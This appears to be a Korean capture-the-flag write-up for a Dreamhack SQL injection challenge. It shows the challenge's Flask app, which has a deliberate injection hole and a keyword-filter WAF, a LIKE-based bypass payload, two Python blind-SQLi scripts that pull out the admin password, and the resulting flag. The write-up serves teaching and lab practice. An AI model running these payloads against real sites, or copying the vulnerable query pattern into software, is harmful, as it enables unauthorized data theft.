---
title: (25) Dreamhack sql injection bypass WAF Advanced 문제 풀이
date: 2024-01-31 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
![](https://kyuyeop.github.io/assets/img/post/25/1.png)
전에도 본적 있는 템플릿의 사이트 입니다.
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
코드를 보면 sqli 필터링을 하고 있습니다. 소문자로 바꾸고 필터링하는 걸 보니 우회해서 `union`을 쓰고 하는것도 어려워 보이고요.  
  
이번에 사용할 방법은 `like` 연산자 입니다.
### LIKE 연산자
LIKE연산자는 `a LIKE b` 형태로 작성해서 b형태와 같은 요소를 찾아줍니다.  
b에는 와일드 카드가 사용가능합니다. 와일드카드 중에는 `%` 와 `_`가 있습니다. 더 많은 와일드카드는 [여기](https://www.w3schools.com/sql/sql_wildcards.asp)서 확인하세요.  
`%`는 모든 문자(개수 제한 x)에 해당하며, `_`은 임의의 한 글자에 해당합니다.  
예를 들자면
```sql
SELECT * FROM user WHERE uid LIKE 'a%';
```
는 uid가 a로 시작하는 유저들을 뱉어주고,
```sql
SELECT * FROM user WHERE uid LIKE 'a_min';
```
같은 경우 `a∎min`인 유저들을 뱉어주죠.  
<br>
  
실제로 우회가 되는지 확인해봅시다.  
  
그냥 `admin`을 입력하면
![](https://kyuyeop.github.io/assets/img/post/25/2.png)
이렇게 필터링이 걸리게 됩니다.  
  
하지만 위에서 알아본 형태를 이용하게 된다면 어떨까요?  
실행할 sqli문은 이겁니다.
```
'||(uid)like('admi_')#
```
필터링을 피하기 위해 `or` 대신에 `||`을 사용했고, 공백도 `/**/`로 우회가 불가능하니 괄호로 처리했습니다. 혹시나 다른 유저가 검색될 수 있으니, 최대한 많은 조건을 줬습니다.
![](https://kyuyeop.github.io/assets/img/post/25/3.png)
이렇게 `admin`이 잘 나오네요.  
  
하지만 여전히 문제가 있습니다. 이 문제는 `admin`계정의 비밀번호가 flag인데 `union`을 막아버렸다는 겁니다. 따라서 blind sql을 해야할 듯 합니다.  
  
그럼 길이 부터 구해보겠습니다.
```python
import requests

host = 'http://host3.dreamhack.games:22353'

i = 1
while 'admin' not in requests.get(host,{'uid':f"'||(uid)like('admi_')&&length(upw)={i}#"}).text:
    i += 1
print(i)
```
`upw`를 `length`에 넣고 while문을 돌리면서 얻었습니다. 구한 길이는 `44`입니다.  
  
길이도 알았겠다, 이제 본격적으로 글자 맞추기를 해야겠죠?
```python
import requests

host = 'http://host3.dreamhack.games:22353'

for i in range(1,45):
    for j in range(0x20, 0x7f):
        if 'admin' in requests.get(host,{'uid':f"'||(uid)like('admi_')&&ascii(substr(upw,{i},1))={j}#"}).text:
            print(chr(j), end='')
            break
```
`44`글자 전부에 대해서 `0x20~0x7f` 사이의 모든 글자를 하나씩 넣어보도록 코드를 만들었습니다.  
`0x00~0x19`까지는 적을 수 없는 문자이고, `0x7f`는 `del` 이기 때문에 1글자인 범위만 가져왔습니다.  
참고로 sqli에서 ascii로 돌려서 비교하는 이유는 sql이 대소문자를 구분 안해주기 때문입니다.  
  
이렇게 돌려서 나온 결과를 확인해보면
```
DH{d3def39496c4153942f3f7d5451a4b98c6db1664}
```
이렇게 flag를 얻을 수 있습니다.
{% endraw %}